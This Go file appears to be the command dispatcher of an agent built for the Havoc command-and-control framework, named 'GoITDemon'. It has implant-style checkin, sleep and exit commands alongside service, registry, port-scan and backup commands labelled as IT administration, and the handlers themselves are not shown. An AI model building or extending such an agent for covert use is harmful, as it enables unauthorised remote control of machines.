package commands

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
)

// Command IDs - must match Havoc teamserver expectations
const (
	// Standard commands
	COMMAND_CHECKIN    = 100
	COMMAND_SLEEP      = 11
	COMMAND_EXIT       = 92
	
	// IT Administration Commands
	COMMAND_SYSINFO    = 3000
	COMMAND_SERVICE    = 3010
	COMMAND_REGISTRY   = 3020
	COMMAND_BACKUP     = 3030
	COMMAND_NETDIAG    = 3040
	COMMAND_HWINFO     = 3050
	COMMAND_SOFTINFO   = 3060
	COMMAND_SYSHEALTH  = 3070
)

// Sub-command IDs
const (
	// System Information
	SYSINFO_OVERVIEW     = 1
	SYSINFO_ENVIRONMENT  = 2
	SYSINFO_SPECS        = 3
	SYSINFO_UPTIME       = 4
	
	// Service Management
	SERVICE_LIST         = 1
	SERVICE_START        = 2
	SERVICE_STOP         = 3
	SERVICE_RESTART      = 4
	SERVICE_STATUS       = 5
	
	// Network Diagnostics
	NETDIAG_PING         = 1
	NETDIAG_TRACEROUTE   = 2
	NETDIAG_DNS_RESOLVE  = 3
	NETDIAG_PORT_SCAN    = 4
	NETDIAG_INTERFACES   = 5
	
	// Hardware Info
	HWINFO_CPU           = 1
	HWINFO_MEMORY        = 2
	HWINFO_DISK          = 3
	HWINFO_ALL           = 6
	
	// System Health
	SYSHEALTH_DISK       = 1
	SYSHEALTH_MEMORY     = 2
	SYSHEALTH_CPU        = 3
	SYSHEALTH_SERVICES   = 5
	
	// Software Information
	SOFTINFO_INSTALLED   = 1
	SOFTINFO_UPDATES     = 2
	SOFTINFO_RUNNING     = 3
	SOFTINFO_STARTUP     = 4
)

// Handler manages command execution
type Handler struct {
	sysInfo    *SysInfoHandler
	service    *ServiceHandler
	registry   *RegistryHandler
	backup     *BackupHandler
	netDiag    *NetDiagHandler
	hwInfo     *HwInfoHandler
	softInfo   *SoftInfoHandler
	sysHealth  *SysHealthHandler
}

// NewHandler creates a new command handler
func NewHandler() *Handler {
	return &Handler{
		sysInfo:   NewSysInfoHandler(),
		service:   NewServiceHandler(),
		registry:  NewRegistryHandler(),
		backup:    NewBackupHandler(),
		netDiag:   NewNetDiagHandler(),
		hwInfo:    NewHwInfoHandler(),
		softInfo:  NewSoftInfoHandler(),
		sysHealth: NewSysHealthHandler(),
	}
}

// Execute runs a command and returns the result
func (h *Handler) Execute(commandID uint32, data []byte) ([]byte, error) {
	switch commandID {
	case COMMAND_CHECKIN:
		return h.handleCheckin(data)
	case COMMAND_SLEEP:
		return h.handleSleep(data)
	case COMMAND_SYSINFO:
		return h.sysInfo.Handle(data)
	case COMMAND_SERVICE:
		return h.service.Handle(data)
	case COMMAND_REGISTRY:
		return h.registry.Handle(data)
	case COMMAND_BACKUP:
		return h.backup.Handle(data)
	case COMMAND_NETDIAG:
		return h.netDiag.Handle(data)
	case COMMAND_HWINFO:
		return h.hwInfo.Handle(data)
	case COMMAND_SOFTINFO:
		return h.softInfo.Handle(data)
	case COMMAND_SYSHEALTH:
		return h.sysHealth.Handle(data)
	case COMMAND_EXIT:
		return h.handleExit(data)
	default:
		return nil, fmt.Errorf("unknown command: %d", commandID)
	}
}

// handleCheckin processes checkin requests
func (h *Handler) handleCheckin(data []byte) ([]byte, error) {
	return []byte("GoITDemon checkin successful"), nil
}

// handleSleep processes sleep configuration changes
func (h *Handler) handleSleep(data []byte) ([]byte, error) {
	if len(data) < 4 {
		return nil, fmt.Errorf("invalid sleep data")
	}
	
	sleepTime := binary.LittleEndian.Uint32(data[:4])
	return []byte(fmt.Sprintf("Sleep time set to %d ms", sleepTime)), nil
}

// handleExit processes exit commands
func (h *Handler) handleExit(data []byte) ([]byte, error) {
	go func() {
		// Exit gracefully after a short delay
		os.Exit(0)
	}()
	return []byte("Agent exiting..."), nil
}

// Utility functions for command handlers

// readUint32 reads a uint32 from the data
func readUint32(data []byte, offset int) (uint32, int) {
	if len(data) < offset+4 {
		return 0, offset
	}
	return binary.LittleEndian.Uint32(data[offset:offset+4]), offset + 4
}

// readString reads a length-prefixed string from the data
func readString(data []byte, offset int) (string, int) {
	if len(data) < offset+4 {
		return "", offset
	}
	
	length := binary.LittleEndian.Uint32(data[offset:offset+4])
	offset += 4
	
	if len(data) < offset+int(length) {
		return "", offset
	}
	
	str := string(data[offset:offset+int(length)])
	return str, offset + int(length)
}

// writeString writes a length-prefixed string to the buffer
func writeString(buf *bytes.Buffer, s string) {
	data := []byte(s)
	binary.Write(buf, binary.LittleEndian, uint32(len(data)))
	buf.Write(data)
}

// writeError creates an error response
func writeError(err error) []byte {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Error flag
	writeString(buf, fmt.Sprintf("ERROR: %v", err))
	return buf.Bytes()
}

// writeSuccess creates a success response
func writeSuccess(data []byte) []byte {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(1)) // Success flag
	buf.Write(data)
	return buf.Bytes()
}

// getPlatform returns the current platform
func getPlatform() string {
	return runtime.GOOS
}

// isWindows checks if running on Windows
func isWindows() bool {
	return runtime.GOOS == "windows"
}

// isLinux checks if running on Linux
func isLinux() bool {
	return runtime.GOOS == "linux"
}